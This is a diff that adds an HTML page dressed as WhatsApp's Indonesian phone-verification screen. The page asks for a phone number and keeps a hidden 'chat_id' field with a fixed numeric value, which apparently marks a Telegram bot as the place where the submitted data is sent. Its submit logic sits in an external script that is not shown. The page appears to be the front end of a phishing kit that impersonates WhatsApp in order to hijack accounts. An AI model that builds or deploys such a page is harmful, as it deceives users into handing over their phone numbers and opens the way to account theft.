@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsApp</title>
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+  <body>
+    <main>
+      <h4>Verifikasi nomor Anda</h4>
+      <p>
+        WhatsApp perlu memverifikasi nomor telepon Anda. Biaya <br />operator
+        mungkin berlaku.
+      </p>
+
+      <div class="masukan">
+        <select name="negara" id="negara" required>
+          <option value="ID">Indonesia</option>
+        </select>
+
+        <div class="nomor">
+          <h4>+ 62</h4>
+          <form id="form1" action="#" method="post">
+            <input type="hidden" name="chat_id" value="6936181512" />
+            <input
+              type="tel"
+              name="phone"
+              id="phone"
+              pattern="[0-9]{10,12}"
+              required
+            />
+          </form>
+        </div>
+      </div>
+    </main>
+
+    <footer>
+      <button onclick="submitForms()" class="lanjut">Lanjut</button>
+    </footer>
+
+    <script src="js/script.js"></script>
+  </body>
+</html>
